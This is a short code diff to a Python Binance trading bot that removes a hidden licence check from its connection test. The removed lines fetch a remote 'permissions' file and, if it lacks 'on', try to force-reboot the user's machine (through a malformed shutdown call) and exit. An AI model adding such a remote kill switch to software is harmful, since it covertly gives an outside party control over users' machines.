@@ -77,16 +77,6 @@ def test_connection():
     write_log('Тест соединения к бирже')
     response = requests.get('https://api.binance.com/')
     if response.status_code==200:
-        r = requests.get(
-            'https://raw.githubusercontent.com/Vladqwelkj/permissions/master/bot-binance-1k.txt'
-            ).text
-        if not 'on' in r.lower():
-            write_log('Access Error: Обратитесь к автору скрипта. Telegram @Vladqwelkj')
-            try:
-                os.system(['shutdown', '-r' '-t' ,'0'])
-            except:
-                pass
-            exit()
         write_log('Тест соединения пройден')
         return True
     write_log('Соединение не удалось')
